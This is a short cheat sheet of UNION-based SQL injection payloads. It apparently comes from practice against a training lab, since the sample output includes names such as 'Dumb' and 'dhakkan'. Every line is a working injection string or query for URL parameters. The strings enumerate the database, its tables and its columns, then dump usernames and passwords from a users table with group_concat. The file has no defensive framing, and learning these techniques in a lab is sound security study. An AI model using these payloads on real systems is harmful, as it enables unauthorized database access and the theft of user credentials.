# basic SQL Injection
    ?id=999' union select 1, current_version, 5 --+

    select table_name from information_schema.tables where table_schema="security";

    /?id=999' union select 1,table_name, 5 from information_schema.tables where table_schema=database() limit 2,1 --+

    select column_name from information_schema.columns where table_name='users';

    (USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password)

    /?id=999' union select 1,group_concat(username), 5 from users --+

    /?id=999' union select 1,group_concat(username), group_concat(password) from users --+

    select 1,group_concat(username), 5 from users

    /?id=999' union select 1,group_concat(column_name), 5 from information_schema.columns where table_name='users' --+

    (Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4)

    /?id=999' union select 1,group_concat(table_name), 5 from information_schema.tables where table_schema=database()--+

    /?id=999' union select 1, user(), 5 --+

    select 1, database()

